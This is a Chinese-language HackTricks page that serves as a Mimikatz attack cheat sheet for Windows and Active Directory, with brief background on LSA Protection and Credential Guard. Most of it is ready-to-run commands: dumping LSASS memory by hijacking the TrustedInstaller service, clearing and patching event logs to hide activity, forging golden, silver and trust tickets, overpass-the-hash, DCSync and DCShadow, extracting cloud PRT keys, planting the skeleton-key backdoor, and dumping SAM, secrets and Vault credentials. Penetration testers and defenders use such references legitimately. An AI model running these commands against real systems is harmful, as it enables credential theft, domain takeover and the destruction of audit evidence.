# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**本页面基于 [adsecurity.org](https://adsecurity.org/?page_id=1821) 上的内容**。如需了解更多信息，请查看原文！<sup>[[3]](#references)</sup>

## 内存中的 LM 和明文

从 Windows 8.1 和 Windows Server 2012 R2 开始，系统实施了重要措施来防止凭据被盗：

- **LM 哈希和明文密码**不再存储在内存中，以增强安全性。必须将特定注册表项 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ 配置为 DWORD 值 `0`，以禁用 Digest Authentication，确保 LSASS 不会缓存“明文”密码。

- **LSA Protection** 已引入，用于保护 Local Security Authority (LSA) 进程免遭未授权的内存读取和代码注入。具体做法是将 LSASS 标记为受保护进程。启用 LSA Protection 的方法如下：
  1. 修改 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ 下的注册表项，将 `RunAsPPL` 设为 `dword:00000001`。
  2. 实施 Group Policy Object (GPO)，在受管理的设备上强制应用此注册表更改。

尽管有这些保护措施，Mimikatz 等工具仍可借助特定驱动绕过 LSA Protection，不过此类操作很可能会记录在事件日志中。

在现代工作站上，这一点尤为重要，因为**许多 Windows 11 22H2+ 和 Windows Server 2025 域加入的非 DC 系统默认启用了 Credential Guard**，而**全新安装的 Windows 11 22H2+ 默认启用了 LSASS-as-PPL**。实际上，这意味着 `sekurlsa::logonpasswords` 通常能获取到的材料比旧式技术预期的更少，操作人员也越来越多地转向**离线 minidump**、**Kerberos 密钥提取 (`sekurlsa::ekeys`)** 或**面向 CloudAP/PRT 的模块**。关于防护措施，请参阅 [Windows credentials protections](credentials-protections.md)。

### 应对 SeDebugPrivilege 移除

管理员通常拥有 SeDebugPrivilege，因此能够调试程序。此权限可以被限制，以防止未经授权的内存转储；攻击者常用这种技术从内存中提取凭据。不过，即使移除了此权限，TrustedInstaller 帐户仍可通过自定义服务配置执行内存转储：

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

这样可以将 `lsass.exe` 的内存转储到文件中，之后可在另一台系统上分析该文件以提取凭据：

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Mimikatz 选项

Mimikatz 中的事件日志篡改主要包括两种操作：清除事件日志，以及修补 Event 服务以阻止记录新事件。以下是执行这些操作的命令：

#### 清除事件日志

Mimikatz 确实提供了 `event::clear`。它会调用 Windows 事件日志清除 API，以清除所选的经典日志。默认日志为 `Security`；`/log:` 用于选择其他日志，调用者需要具备清除该日志的权限。这与 `event::drop` 不同，后者会尝试阻止写入新记录。<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Experimental Feature: Patching the Event Service

- **命令**：`event::drop`
- 这条实验性命令旨在修改 Event Logging Service 的行为，从而阻止其记录新事件。
- 示例：`mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` 命令确保 Mimikatz 具备修改系统服务所需的权限。
- `event::drop` 命令随后会对 Event Logging service 进行 patch。

### Kerberos Ticket 攻击

使用以下命令快速查阅语法。[golden tickets](../active-directory-methodology/golden-ticket.md)、[silver tickets](../active-directory-methodology/silver-ticket.md)、[diamond tickets](../active-directory-methodology/diamond-ticket.md) 和 [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) 的专门页面介绍了最新的 AES/PAC/opsec 细节。

### Golden Ticket 创建

Golden Ticket 可用于模拟身份，获取整个域的访问权限。关键命令和参数：

- 命令：`kerberos::golden`
- 参数：
  - `/domain`：域名。
  - `/sid`：域的 Security Identifier (SID)。
  - `/user`：要模拟的用户名。
  - `/krbtgt`：域 KDC 服务帐户的 NTLM hash。
  - `/ptt`：将 ticket 直接注入内存。
  - `/ticket`：保存 ticket 以供后续使用。

示例：

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Silver Ticket Creation

Silver Ticket 可授予对特定服务的访问权限。关键命令和参数：

- 命令：与 Golden Ticket 类似，但目标是特定服务。
- 参数：
  - `/service`：要作为目标的服务（例如 cifs、http）。
  - 其他参数与 Golden Ticket 类似。

示例:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Trust Ticket 创建

Trust Ticket 用于利用信任关系跨域访问资源。关键命令和参数：

- 命令：类似于 Golden Ticket，但用于信任关系。
- 参数：
  - `/target`：目标域的 FQDN。
  - `/rc4`：信任账户的 NTLM 哈希。

示例：

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Additional Kerberos Commands

- **列出 Tickets**：

  - 命令：`kerberos::list`
  - 列出当前用户会话的所有 Kerberos tickets。

- **Pass the Cache**：`kerberos::ptc` 读取 MIT/Heimdal `.ccache` 文件，**不**读取 `.kirbi` 文件。将文件路径作为位置参数传入：`mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`。<sup>[[5]](#references)</sup>

- **Pass the Ticket**：`kerberos::ptt` 读取 `.kirbi` 文件或包含此类文件的目录。它同样使用位置路径，而不是 `/ticket:`：`mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`。更完整的工作流程请参阅 [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md)。<sup>[[6]](#references)</sup>

- **清除 Tickets**：
  - 命令：`kerberos::purge`
  - 清除会话中的所有 Kerberos tickets。
  - 在使用 ticket 操作命令前很有用，可避免冲突。

### Over-Pass-the-Hash / Pass-the-Key

如果 `RC4` 已禁用或不可靠，Mimikatz 可以将 **AES128/AES256 Kerberos keys** 注入当前登录会话，而不只是使用 NT hash。与将 `sekurlsa::pth` 视为仅适用于 NTLM 的命令相比，这通常更适合现代域。<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` 会复用当前进程，而不是启动新的控制台；如果你想在同一上下文中立即运行 `lsadump::dcsync` 等命令，这会很方便。

### Active Directory 篡改

- **DCShadow**：暂时让一台机器充当 DC，以操纵 AD 对象。参见 [DCShadow](../active-directory-methodology/dcshadow.md)。

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**：模拟 DC，以请求密码数据。参见 [DCSync](../active-directory-methodology/dcsync.md)。
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### 凭据访问

- **LSADUMP::LSA**：从 LSA 提取凭据。

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**：使用计算机帐户的密码数据模拟 DC。

  - _原始上下文中未提供 NetSync 的具体命令。_

- **LSADUMP::SAM**：访问本地 SAM 数据库。

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**：解密存储在注册表中的机密。

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**：为用户设置新的 NTLM 哈希。

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**：检索信任身份验证信息。
  - `mimikatz "lsadump::trust" exit`

### 云凭据 / Entra ID

在 **Entra ID** 或 **混合加入**的主机上，`sekurlsa::cloudap` 可以从 LSASS 中提取缓存的 **Primary Refresh Token (PRT)** 材料。其 `ProofOfPossesionKey.KeyValue` 是受 DPAPI 保护的会话密钥 blob，而不是已经解密的密钥。<sup>[[7]](#references)[[8]](#references)</sup> 若要使用 `/unprotect`，请以 `SYSTEM` 身份运行 `dpapi::cloudapkd`（例如，在提升权限的 Mimikatz 会话中运行 `token::elevate`），或者先使用 `sekurlsa::dpapi` 填充 Mimikatz 的密钥缓存。仅运行 `privilege::debug` 不会切换 DPAPI 调用者上下文。<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

复制第一条命令中的**匹配项** `Context` 和 `Derived Key` 到第二条命令中；如果未提供 context，Mimikatz 会生成新的 context。即使密钥受 TPM 保护，Mimikatz 也可能通过在原设备上使用 TPM 来派生签名密钥。无需导出明文密钥，但成功派生密钥后即可对浏览器 cookie 签名。<sup>[[7]](#references)</sup>

单独的 PRT 字符串并不足够，因为 Microsoft Entra 要求证明持有相关联的会话密钥。<sup>[[9]](#references)</sup> 有关其他主密钥选项，请参阅 [DPAPI key recovery](../windows-local-privilege-escalation/dpapi-extracting-passwords.md)；有关云端攻击链，请参阅 [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html)。

### 杂项

- **MISC::Skeleton**：向 DC 上的 LSASS 注入后门。
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### 权限提升

- **PRIVILEGE::Backup**：获取备份权限。

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**：获取调试权限。
  - `mimikatz "privilege::debug" exit`

### 凭据转储

- **SEKURLSA::LogonPasswords**：显示已登录用户的凭据。

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**：从内存中提取 Kerberos 票据。
  - `mimikatz "sekurlsa::tickets /export" exit`

### SID 和令牌操纵

- **SID::add/modify**：更改 SID 和 SIDHistory。

  - 添加：`mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - 修改：_原始上下文中没有专门用于修改的命令。_

- **TOKEN::Elevate**：冒充令牌。
  - `mimikatz "token::elevate /domainadmin" exit`

### 终端服务

- **TS::MultiRDP**：允许多个 RDP 会话。

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**：列出 TS/RDP 会话。
  - _未提供 TS::Sessions 的具体命令。_

### Vault

- 从 Windows Vault 中提取密码。
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [The Hacker Tools – Mimikatz 模块](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB 和 Entra ID：认识全新的缓存流程](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz 命令参考](https://adsecurity.org/?page_id=1821)
- [4] [Mimikatz event 模块源代码](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Mimikatz ccache 模块源代码](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Mimikatz Kerberos 模块源代码](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Mimikatz CloudAP DPAPI 实现](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [进一步探究 Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Microsoft Entra Primary Refresh Token 保护机制](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
